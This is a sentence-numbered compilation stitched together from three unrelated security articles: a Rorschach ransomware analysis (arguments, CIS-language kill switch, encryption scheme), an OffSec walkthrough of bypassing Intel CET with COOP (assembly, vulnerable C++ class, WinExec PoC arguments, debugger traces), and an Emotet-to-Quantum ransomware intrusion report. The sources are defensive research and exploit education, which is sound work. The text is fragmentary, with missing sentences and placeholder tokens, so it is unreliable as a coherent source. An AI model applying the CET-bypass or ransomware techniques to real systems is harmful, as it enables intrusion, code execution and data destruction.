sentence.439: This table contains some of the arguments that we discovered: ArgumentExample ParameterDescription–run=1234Password needed to run the sample, possibly built on demand.–nomutex=1Do not create a mutex, therefore do not insure that only a single instance is running.–log=1Create log <DATA_OBJECT>.–nodel=0Do not self-delete on execution.–path=“C:”Encrypt only the following path.–noshare=1Do not encrypt shares.–pt=”C:.dll”Explicitly state the loader DLL.–cg=”C:.ini”Explicitly state the configuration <DATA_OBJECT> that stores the malware.–we=”C:.exe”Explicitly state the main executable.–diskpart=1Run <FILENAME> <FILE_PATH> AppData_x.txt that removes read-
sentence.440: only volume attributes.–nobk=1Do not change the wallpaper of the infected machine.–thread=4Number of threads per CPU.–at=2023<FILE_PATH> 05:04:20Activation time (trigger time).–nomail=1Do not create a ransom note.
sentence.441: This is only a partial list, with additional arguments suggesting networking capabilities, such as listen, srv and hostfile.
sentence.442: Example of how some of these arguments are used: <FILENAME> --run=1234 --nomutex=0 --log=1 --nodel=1 --path="<FILE_PATH>"
sentence.444: --nobk=0 Language Based Protection Before encrypting the target system, the sample runs two system checks that can halt its execution: It uses GetSystemDefaultUILanguage and GetUserDefaultUILanguage to determine what language the user is using.
sentence.445: It exits if the return value is commonly used in CIS countries: { 0x042b: "Armenian_Armenia", 0x042c: "Azeri_Latin", 0x043f: "Kazakh", 0x082c: "Azeri_Cyrillic", 0x419: "Russian", 0x422: "Ukrainian", 0x423: "Belarusian", 0x428: "Tajik", 0x437: "Georgian", 0x440: "Kyrgyz_Cyrillic", 0x442: "Turkmen", 0x443: "Uzbek_Latin", 0x819: "Russian_Moldava", 0x843: "Uzbek_Cyrillic" } Encryption Process The Rorschach ransomware employs a highly effective and fast hybrid-cryptography scheme, which blends the curve25519 and eSTREAM cipher hc-128 algorithms for encryption purposes.
sentence.446: This process only encrypts a specific portion of the original <DATA_OBJECT> content instead of the entire <DATA_OBJECT>.
sentence.447: The WinAPI CryptGenRandom is utilized to generate cryptographically random bytes used as a per-victim private key.
sentence.448: The shared secret is calculated through curve25519, using both the generated private key and a hardcoded public key.
sentence.449: Finally, the computed SHA512 hash of the shared secret is used to construct the KEY and IV for the eSTREAM cipher hc-128.
sentence.451: Analysis of Rorschach’s encryption routine suggests not only the fast encryption scheme mentioned previously but also a highly effective implementation of thread scheduling via I<FILE_PATH> completion ports.
sentence.452: In addition, it appears that compiler optimization is prioritized for speed, with much of the code being inlined.
sentence.453: All of these factors make us believe that we may be dealing with one of the fastest ransomware out there.
sentence.454: To verify our hypothesis, we conducted five separate encryption speed tests in a controlled environment (with 6 CPUs, 8192MB RAM, SSD, and 220000 <DATA_OBJECT> to be encrypted), limited to local drive encryption only.
sentence.455: To provide a meaningful comparison with other known fast ransomware, we compared Rorschach with the notorious LockBit v.3.
sentence.456: The result of the speed tests: RansomwareAverage approximate time of encryptionLockBit v.37 minutesRorschach4 minutes, 30 secondsIt turned out that we have a new speed demon in town.
sentence.457: What’s even more noteworthy is that the Rorschach ransomware is highly customizable.
sentence.458: By adjusting the number of encryption threads via the command line argument --thread, it can achieve even faster times.
sentence.460: When we compared Rorschach to other well-known ransomware families, we noticed that Rorschach uses a variety of time-honored methods together with some novel ideas in the ransomware industry.
sentence.461: The name itself, “Rorschach”, is quite self-explanatory; with deep reverse engineering of the code and its logic, we found certain similarities with some of the more technically advanced and established ransomware groups.
sentence.462: We discussed Rorschach’s hybrid-cryptography scheme in detail above, but we suspect that this routine was borrowed from the leaked source code of Babuk ransomware.
sentence.463: See the following code snippets as examples: Figure 7 – Hybrid-cryptography scheme of Rorschach vs. Babuk.
sentence.464: Rorschach’s inspiration from Babuk is evident in various routines, including those responsible for stopping processes and services.
sentence.465: In fact, the code used to stop services through the service control manager appears to have been directly copied from Babuk’s source code: Figure 8 – Stopping predefined list of services – Rorschach vs. Babuk.
sentence.466: It is also worth noting that the list of services to be stopped in Rorschach’s configuration is identical to that in the leaked Babuk source code.
sentence.467: However, the list of processes to be stopped differs slightly, as Rorschach omits <FILENAME>, which is used as a target for code injection.
sentence.468: Rorahsach takes inspiration from another ransomware strain: LockBit.
sentence.469: First, the list of languages used to halt the malware is exactly the same list that was used in LockBit v2.0 (although the list is commonly used by many Russian speaking groups, and not just LockBit).
sentence.470: However, the I<FILE_PATH> Completion Ports method of thread scheduling is another component where Rorschach took some inspiration from LockBit.
sentence.471: The final renaming of the encrypted machine <DATA_OBJECT> in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0.
sentence.472: Figure 9 – Renaming of encrypted <DATA_OBJECT> using NtSetInformationFile.
sentence.473: As noted before, Rorschach’s code is protected and obfuscated in a way that is unusual for ransomware, and is compiled with compiler optimization to favor speed and code inlining as much as possible.
sentence.474: This makes finding similarities with other well-known ransomware families a real brain-buster.
sentence.475: But we can still say that Rorschach took the best from the ransomware families with the highest reputation, and then added some unique features of its own.
sentence.476: Ransom Notes As we noted, Rorschach does not exhibit any clear-cut overlaps with any of the known ransomware groups but does appear to draw inspiration from some of them.
sentence.477: We mentioned previously that Ahnlab reported a similar attack earlier this year.
sentence.478: While it was carried out through different means, the ransomware described in the report triggers an almost identical execution flow.
sentence.479: However, the resulting ransom note was completely different.
sentence.480: The note was actually very similar to those issued by DarkSide, which probably led to this new ransomware being named “DarkSide,” despite the group being inactive since May 2021.
sentence.481: The Rorschach variant we analyzed leaves a different ransom note based on the structure used by Yanlowang, another ransomware group: Figure 10 – Ransom note from Rorschach.
sentence.482: Conclusion Our analysis of Rorschach reveals the emergence of a new ransomware strain in the crimeware landscape.
sentence.483: Its developers implemented new anti-analysis and defense evasion techniques to avoid detection and make it more difficult for security software and researchers to analyze and mitigate its effects.
sentence.484: Additionally, Rorschach appears to have taken some of the ‘best’ features from some of the leading ransomwares leaked online, and integrated them all together.
sentence.485: In addition to Rorschach’s self-propagating capabilities, this raises the bar for ransom attacks.
sentence.486: The operators and developers of the Rorschach ransomware remain unknown.
sentence.487: They do not use branding, which is relatively rare in ransomware operations.
sentence.488: Our findings underscore the importance of maintaining strong cybersecurity measures to prevent ransomware attacks, as well as the need for continuous monitoring and analysis of new ransomware samples to stay ahead of evolving threats.
sentence.489: As these attacks continue to grow in frequency and sophistication, it is essential for organizations to remain vigilant and proactive in their efforts to safeguard against these threats.
sentence.490: Harmony Endpoint provides runtime protection against ransomware with instant automated remediation, even in offline mode.
sentence.491: When running on a machine infected with the Rorschach ransomware, Harmony Endpoint Anti-ransomware detected the encryption process in different folders, including modifications made to Harmony Endpoint ‘honeypot’ <DATA_OBJECT>.
sentence.492: It ran a ranking algorithm that provided a verdict identifying the process as a ransomware.

sentence.509: title: Bypassing Intel CET with Counterfeit Objects | OffSec url: <URL> Bypassing Intel CET with Counterfeit Objects Matteo Malvica Content Developer Since its inception in 2005, return-oriented programming (ROP) has been the predominant avenue to thwart W^X mitigation during memory corruption exploitation.
sentence.510: While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.
sentence.511: These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run.
sentence.512: To permanently block ROP attacks, a new hardware-enforced Control Flow Integrity mitigation called Control Enforcement Technology (CET) has been developed by Intel and first shipped on Windows systems roughly two years ago.
sentence.513: At first, the advent of CET painted a bleak picture future for exploit developers and their reliance on ROP-based techniques.
sentence.514: However, in 2015, a new code-reuse technique named Counterfeit Object-Oriented Programming (COOP) has been formulated in a paper which seemed quite promising in defeating Control-Flow Integrity (CFI) defenses.
sentence.515: In this blog, we’ll briefly cover how CFI mitigations works, including CET, and how we can leverage COOP to effectively bypass Intel CET on the latest Windows releases.
sentence.516: Forward-Edge and Backward-Edge CFI Control Flow Integrity mechanisms can be grouped into two main categories: forward-edge and backward-edge.
sentence.517: Forward-edge CFI, like Microsoft CFG, protects indirect function calls through the use of verified function addresses.
sentence.518: For instance, if we overwrite the pointer dereferenced in a CALL [rax] instruction with a ROP gadget address, CFG will block our exploit by throwing an exception.
sentence.519: Conversely, backward-edge CFI like Intel’s CET protects a function’s return address by comparing it to a previously saved version of the address that is stored on the Shadow Stack.
sentence.520: If the original return address gets overwritten during a memory corruption exploit, the address comparison will inevitably fail and the application will be terminated.
sentence.521: Given that ROP-based attacks execute “RET” instructions without a prior “CALL” instruction, the running thread’s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique.
sentence.522: Intel CET has been designed to mitigate ROP attacks through both the Shadow Stack and COP<FILE_PATH> via Indirect Branch Tracking (IBT).
sentence.523: However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to “Intel CET” as the implementation with only Shadow Stack enabled.
sentence.524: CET internals have been documented extensively in previous researches [6][7] and we have already demonstrated how the mitigation works and on which major software CET has been deployed.
sentence.525: At the time of this writing the landscape hasn’t changed much and every major browser continues to run CET on every process except the renderer process.
sentence.526: This means that the way CET is currently implemented is quite ineffective because the renderer process is the one that gets typically exploited.
sentence.527: Even though CET is still not widely enforced on browsers we should expect it to be enforced on every process over the coming years.
sentence.528: To avoid getting caught unprepared, as researchers, we should improve our tradecraft and constantly learn about newly developed attack angles.
sentence.529: Additionally, no matter how impeding a mitigation might be, we need to broaden our horizon if we want to find any weaknesses.
sentence.530: Counterfeiting Objects As mentioned in this post’s premise, a novel code reuse technique named Counterfeit Object-Oriented Programming or COOP has been put together by Felix Schuster in 2015.
sentence.531: We should note that this paper is quite theoretical.
sentence.532: The technique has not been observed implemented in the wild or in disclosed exploits.
sentence.533: Our goal for this blog post is to try to leverage this theoretical approach and implement it in a proof of concept in order to bypass Intel CET.
sentence.534: The main idea behind this technique is counterfeiting – that is crafting new objects in-memory from attacker-controlled payloads and to chain them together through virtual functions that are already present in the target application or in loaded libraries.
sentence.535: Each virtual function contained in a counterfeit object is called a vfgadget and is responsible for performing a small task.
sentence.536: Similarly to ROP, vfgadgets can perform tasks like populating a value into a register.
sentence.537: However when grouped together, multiple vfgadgets can execute more advanced operations.
sentence.538: As no specific tools exist today to discover vfgadgets, they can be found through custom scripts such as IDAPython, using a process similar to ROP gadget discovery.
sentence.539: Since vfgadgets are picked from a pool of CFG-valid functions we can mark them as legitimate, and their execution will not be blocked by CFG once we hijack an indirect call with one of them.
sentence.540: In addition, an interesting corollary is that Intel CET won’t be triggered since we won’t corrupt any function return address during the process of calling vfgadgets in sequence.
sentence.541: As illustrated in Schuster’s paper, a typical COOP payload begins with a foundational vfgadget that acts as the COOP’s main function.
sentence.542: We’ll refer to it as Looper in this blog post.
sentence.543: Once the attacker has assembled the counterfeit object in memory, the Looper vfgadget iterates over an array of other vfgadgets, carefully prearranged by the attacker, which will be invoked one by one.
sentence.544: By aligning the vfgadgets in the counterfeit object in such a way, we’ll be able to call valid virtual functions in a controlled manner.
sentence.545: Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.
sentence.546: These vfgadgets will be stored at regular intervals within the the array accessed by the Looper.
sentence.547: An Argument Loader vfgadget populates a given register by loading a value into it.
sentence.548: The value to be loaded will be stored inside the counterfeit object at an offset from the beginning of the fake object.
sentence.549: Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API.
sentence.550: Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API).
sentence.551: The following graph sum-up the COOP attack strategy discussed so far.
sentence.552: COOP attack flow We can arrange and mix different vfgadgets based on their availability and the desired APIs that we want to execute.
sentence.553: In order to better understand a COOP attack, let’s start by analyzing the main vfgadget, the Looper.
sentence.554: The following assembly code provides a simplified version of a Looper COOP vfgadget: mov rbx, [rcx+0x40] loop_start: mov rax, [rbx] call cs:__guard_dispatch_icall_fptr mov rbx, [rbx+20h] test rbx, rbx jnz short loop_start ...
sentence.555: loop_exit: ret Looper Gadget relevant ASM code On the first line, RCX holds the this pointer and we load into RBX the start of the counterfeit object that has been placed at offset 0x40 from RCX.
sentence.556: Since all the items in our counterfeit objects will be referenced at offsets from thethis pointer, we need to make sure to save its value before hijacking the program flow (i.e by corrupting a vtable).
sentence.557: The COOP payload base address is then dereferenced into RAX which points to the first vfgadget that gets called.
sentence.558: Once the call returns, a new vfgadget is loaded at offset 0x20 from the previous gadget and if the content of RBX is not zero, a new iteration of the loop takes place.
sentence.559: While writing our counterfeit object in memory, we need to align upfront each vfgadget to match the Looper offsets, similarly to the following layout:
sentence.560: The COOP buffer in memory Here, 00000227`26cd8900 is the base address of our COOP payload, which is stored at offset 0x40 from the this pointer (RCX).
sentence.561: From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget.
sentence.562: On the next loop iteration the Looper repeats the same task by loading a pointer at offset 0x20 from the previous one and ultimately invokes the second vfgadget.
sentence.563: When exploiting real-world targets such browsers, it is recommended to rely on the Looper vfgadget because it gives more control and stability over the other vfgadgets.
sentence.564: However, for the sake of brevity, we wrote our vulnerable application with only a single Invoker vfgadget which accepts one argument, as we’ll see in the next section.
sentence.565: Having covered introductory COOP theory, let’s move on to exploiting a CET-compiled proof of concept application that we developed to showcase COOP attacks.
sentence.566: Bypassing the CET Shadow Stack with COOP The vulnerable application we wrote is compiled with CET and CFG in addition to DEP, which is on by default.
sentence.567: First off, to verify that CET is really enforced, we place a breakpoint on printf, inspect the call-stack, overwrite the return address and resume execution.
sentence.568: 0:000> bp printf 0:000> g 0:000> k # Child-SP RetAddr Call Site 00
sentence.581: g (16c0.f68): Security check failure or stack buffer overrun - code c0000409 (!!!
sentence.583: Subcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation coop!printf+0x56: 00000001`400187e6 c3 ret Verifying that CET is enforced We get confirmation that CET is enabled as we are immediately prompted with a Shadow Stack exception referring to an invalid return address.
sentence.584: As CET is a hardware-enforced mitigation, in order to trigger the above error we would need at least an 11th Generation Core ‘Tiger Lake’ CPU To simulate a browser vulnerability, we can obtain RIP control by taking advantage of a type confusion vulnerability in the application that is triggered automatically when the application is executed.
sentence.585: When we hit the trigger for the vulnerability, a vtable pointer gets corrupted by our input, leading to an indirect call that we have control over.
sentence.586: We then hijack the vtable to make it point to our COOP buffer where our first (and only) vfgadget resides.
sentence.587: As mentioned earlier, instead of using a Looper with nested vfgadget, for the sake of brevity, we opted to use a single gadget that features both the Invoker and Argument Loader components.
sentence.588: As part of the automated part of the exploit, in order to obtain the vfgadget’s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack.
sentence.589: Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.
sentence.590: This is done by writing both the Windows API address and the arguments at the required offsets inside the counterfeit object.
sentence.591: Before exploring the COOP payload in more detail, let’s first understand the PoC’s syntax by running it without any arguments.
sentence.595: 5086014001000000 f0040becfb7f0000 "<FILENAME>" Getting the PoC’s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.
sentence.596: The helper shows two simple use-cases but this can be of course expanded to invoke any CFG-allowed API (if the application is compiled with it).
sentence.597: Since Windows DLLs will load at a random base address, it is required to calculate the desired API’s address beforehand.
sentence.598: Let’s first inspect the C++ code of the object related to our vfgadget, and then explore its corresponding assembly from the compiled binary: class OffSec { public: char* a; int (*callback)(char* a);
sentence.599: public: virtual void trigger(char* a1) { callback(a); } }; The ‘trigger’ method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we’ll see shortly.
sentence.600: Then, the ‘OffSec’ class is instantiated in the main program routine so it gets loaded in memory along with its methods.
sentence.601: Taking a closer look at the Invoker in the disassembler reveals a few interesting aspects.
sentence.602: Invoker vfgadger Starting from the second to the fourth line, the this pointer, referenced by RCX, is first stored on the stack and then moved into RAX.
sentence.603: Next, the value at offset 0x10 from RAX is dereferenced and moved into RAX.
sentence.604: This value will be the API function pointer residing in our counterfeit object.
sentence.605: Then at line 7 and 8 the first function argument is dereferenced at offset 0x8 from the this pointer and moved into RCX.
sentence.606: As we’ll soon discover, the vulnerable application will take care of these offsets once we have submitted the parameters from the command line.
sentence.607: Having covered the main building blocks of our attack chain, let’s try to run the PoC by passing the four arguments in order to gain code execution: C:\> <FILENAME> 00001e000000
sentence.608: 5086014001000000 40610fecfb7f0000 "<FILENAME> <FILE_PATH> calc" Running the PoC application with all parameters With the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address.
sentence.609: As a final argument we pass the WinExec string argument.
sentence.610: Note that all memory addresses are passed in little-endian format.
sentence.611: Once started, the application halts immediately, allowing us to attach the debugger to it.
sentence.612: Before doing so, we launch Process Explorer to verify that the binary is actually running with Intel CET enabled.
sentence.613: Verifying that CET is enabled with Process Explorer Under the “Stack Protection” column, Process Explorer confirms that CET is enforced for only the CET-compatible modules, meaning that the mitigation will be enforced for any module compiled with CET.
sentence.615: Once the debugger is attached, we place a breakpoint to the only indirect call present in the main function and continue execution.
sentence.619: :**** coop!main+0x3d2 0:001> u 00000001`4001847e L1 coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr
sentence.621: g Breaking at the Indirect Call We placed a breakoint at main+0x3d2 and verified that we have indeed an indirect call at that address.
sentence.622: Next we dump the content of our counterfeit object located at the static address 0x1e0000, which holds a pointer to our vfgadget at 00000001400186a0 At main+0x3d2 is where the type confusion bug ignites and allows us to take control over RIP.
sentence.623: As soon as we hit the breakpoint we inspect the value residing at our COOP buffer, which should be the first Invoker vfgadget.
sentence.624: We let the application continue and verify that we indeed hit our breakpoint.
sentence.625: Breakpoint 0 hit coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)} 0:000>t ntdll!LdrpDispatchUserCallTarget:
sentence.629: [rsp+10h],rdx ss:00000000`0014fdf8=0000000000612b77 Landing on the first COOP vfgadget After tracing into the CFG LdrpDispatchUserCallTarge routine
sentence.630: we jump to the Invoker vfgadget ‘OffSec::trigger”, proving that we have control over the program’s execution flow.
sentence.631: We then continue tracing inside the vfgadget:
sentence.636: 00000001`4001865a 4883ec38 sub rsp,38h 0:000> coop!OffSec::trigger+0xe: 00000001`4001865e 488b442440 mov rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80 Moving the ‘this’ pointer into RAX In the above listing, the Invoker first saves the this pointer from RCX into the stack, and we also verify that it points to the base of our COOP buffer.
sentence.637: On the last instruction the ‘this’ pointer is loaded into RAX, which will be used as a reference to invoke the API and its argument: 0:000>
sentence.641: Loading WinExec parameters from the ‘this’ pointer First, at offset 0x10 we can see that WinExec address is loaded into RAX and then, three instructions later, the command parameter gets retrieved at offset 0x8.
sentence.642: Once we let execution continue, we invoke LdrpDispatchUserCallTarget again which in turn dispatches execution to WinExec and welcomes us with our calculator.
sentence.644: This completes our brief proof-of-concept where we demonstrated that we can bypass the Intel CET Shadow Stack and obtain arbitrary code execution via a COOP attack by calling CFG-allowed functions while simultaneously avoiding corrupting any return address.
sentence.645: The Visual Studio project for this PoC application can be found at the following URL.
sentence.646: Conclusions Intel CET provides yet another strong defensive mechanism that surely steps up the exploit development game.
sentence.647: Nonetheless, new attack pathways such as COOP can be adopted to circumvent this mitigation.
sentence.648: As we learned so far, COOP vfgadgets are inherently allowed by CFG and so, in a real-world scenario they could be chained together to circumvent Intel CET and possibly other CFI mitigations.
sentence.649: About The Author Matteo Malvica Content Developer Matteo Malvica is a content developer at Offensive Security focusing on vulnerability research, exploit development, reverse engineering and operating system internals.
sentence.650: title: Emotet Strikes Again - LNK <DATA_OBJECT> Leads to Domain Wide Ransomware -
sentence.652: In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over a eight day period.
sentence.653: During this time period, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike.
sentence.654: Remote access tools were used for command and control, such as Tactical RMM and Anydesk.
sentence.655: The threat actors final actions included data exfiltration using Rclone and domain wide deployment of Quantum Ransomware.
sentence.656: We have observed similar traits in previous cases where Emotet and Quantum were seen.
sentence.657: Case Summary The intrusion began when a user double clicked a LNK <DATA_OBJECT>, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.
sentence.658: Once executed, Emotet setup a <DATA_OBJECT> Run Key to maintain persistence on the beachhead host.
sentence.659: Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.
sentence.660: These commands would go on to be repeated daily by the Emotet process.
sentence.661: Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.
sentence.662: Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.
sentence.663: Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.
sentence.664: Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.
sentence.665: The threat actor then moved laterally to a workstation.
sentence.666: They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.
sentence.667: Next, they proceeded to transfer a beacon executable over <PROTOCOL> to the remote host’s ProgramData directory.
sentence.668: This beacon was then successfully executed via WMI and connected successfully to the threat actors server.
sentence.669: Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.
sentence.670: They then proceeded to dump <DATA_OBJECT> from the LSASS process on the host.
sentence.671: With some further process injection they then began to enumerate <PROTOCOL> shares across the environment and on finding a primary <DATA_OBJECT> server reviewed several documents present on the server.
sentence.672: This Cobalt Strike server stopped communicating shortly there after.
sentence.673: On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.
sentence.674: Again, some net command discovery was run for domain admins and domain controller servers.
sentence.675: A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.
sentence.676: The threat actors, however, proceeded along a more traditional path, using <PROTOCOL> <DATA_OBJECT> transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.
sentence.677: On the domain controller, the threat actors conducted further discovery tasks running <FILENAME> and <FILENAME>, which executed AdFind active directory discovery and performed a ping sweep across the environment.
sentence.678: On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.
sentence.679: From this server, the threat actors were observed using Rclone to exfiltrate data from a <DATA_OBJECT> share server in the environment.
sentence.680: The <DOMAIN> service was the location the stolen data was sent.
sentence.681: On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue.
sentence.682: After this the threat actors went silent until the eighth and final day of the intrusion.
sentence.683: On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.
sentence.684: After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect’s Network Scanner and ran it to identify hosts across the environment.
sentence.685: From there, the threat actors began connecting to other hosts via <PROTOCOL>, including the a backup server.
sentence.686: After choosing a new server and connecting via <PROTOCOL>, the threat actors dropped <FILENAME> and <FILENAME> in preparation for their final actions.
sentence.687: Finally, <FILENAME> and a batch <DATA_OBJECT> <FILENAME> were dropped on the host and the batch <DATA_OBJECT> was executed beginning the Quantum rasomware deployment to all hosts over <PROTOCOL>.
sentence.688: From initial intrusion to ransomware deployment, 154 hours passed, over eight days.
sentence.689: After ransomware deployment, the threat actors remained connected and did <PROTOCOL> to a few other servers and executed <FILENAME> and a net command.
sentence.690: With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network.
sentence.691: Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
sentence.692: More information on this service and others can be found here.
sentence.693: Both of the Cobalt Strike servers in this case were on our Threat Feed (days to months) in advance of this intrusion.
sentence.694: We also have artifacts and IOCs available from this case such as pcaps, memory captures, <DATA_OBJECT>, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.
sentence.695: Timeline Report Lead: @iiamaleksAnalysis and reporting: @samaritan_o, and @yatinwad Initial Access Initial access took the form of an LNK <DATA_OBJECT> delivered to a victim through a MalSpam campaign.

sentence.730: One indicator is the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.
sentence.731: During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt.
sentence.732: Defense Evasion Process Injection The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing <DATA_OBJECT> from the system.
sentence.733: The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.
sentence.734: This occurred from <FILENAME>, which was previously used to execute and run Cobalt Strike.

sentence.792: Once establishing the <PROTOCOL> connection, they deployed <FILENAME>, likely to prevent intervention by any security tools and launched the software Don’t Sleep.
